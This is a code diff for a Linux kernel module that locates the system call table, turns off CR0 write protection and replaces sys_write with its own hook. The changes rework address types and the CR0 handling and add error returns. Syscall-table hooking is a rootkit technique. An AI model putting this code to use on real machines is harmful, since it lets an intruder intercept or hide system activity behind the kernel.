@@ -21,8 +21,7 @@
 
 MODULE_LICENSE("Dual MIT/GPL");
 
-unsigned long original_cr0;
-unsigned long *sys_write_address;
+void *sys_write_address;
 unsigned long **sct = NULL;
 
 asmlinkage long (* orig_write) (unsigned int, const char __user *, size_t);
@@ -37,9 +36,11 @@ static int find_address_sct(void)
 {
 	unsigned long offset = PAGE_OFFSET;	// Start of kernel RAM
 
+	printk(KERN_INFO "sys_write_address = %p\n", sys_write_address);
 	printk(KERN_INFO "looking for sct address\n");
 	while (offset < ULLONG_MAX) {
 		sct = (unsigned long **)offset;
+
 
 		if (sct[__NR_write] == sys_write_address) {
 			return 0;
@@ -84,7 +85,7 @@ static int find_address_write(void)
 				}
 				// Separate the address field from the string
 				strncpy(tmp, strsep(&ptr, " "), MAX_LEN);
-				sys_write_address = (unsigned long *)
+				sys_write_address = (void *)
 						simple_strtoul(tmp, NULL, 16);
 				kfree(tmp);
 				break;
@@ -103,35 +104,35 @@ static int find_address_write(void)
 static int assign_hook(unsigned long **sct)
 {
 	printk(KERN_INFO "Attempting to hook sys_write\n");
-	write_cr0(original_cr0 & ~0x10000);		// Swap the ro flag to rw
+	write_cr0(read_cr0() & (~ 0x10000));		// Swap the ro flag to rw
 	orig_write = (void *) sct[__NR_write];		// save for later
 	sct[__NR_write] = (long *) new_write;		// assign our own function
-	write_cr0(original_cr0);
+	write_cr0(read_cr0() | 0x10000);
 	return 0;
 }
 
 static int unassign_hook(void) {
 	printk(KERN_INFO "Removing sys_write hook\n");
-	write_cr0(original_cr0 & ~0x10000);
+	write_cr0(read_cr0() & (~ 0x10000));
 	sct[__NR_write] = (void *) orig_write;
-	write_cr0(original_cr0);
+	write_cr0(read_cr0() | 0x10000);
 	return 0;
 }
 
 static int __init loader(void)
 {
-	original_cr0 = read_cr0();
 
 	printk(KERN_EMERG "Loading %s\n", MODULE_NAME);
 	if (find_address_write() < 0)
 		return -EIO;
 	if (find_address_sct() < 0) {
 		printk(KERN_INFO "Failed to retrieve sct\n");
+		return -EIO;
 	} else {
 		printk(KERN_INFO "System call table found!\n");
 		assign_hook(sct);
+		printk(KERN_EMERG "Loaded %s successfully\n", MODULE_NAME);
 	}
-	printk(KERN_EMERG "Loaded %s successfully\n", MODULE_NAME);
 	return 0;
 }
 
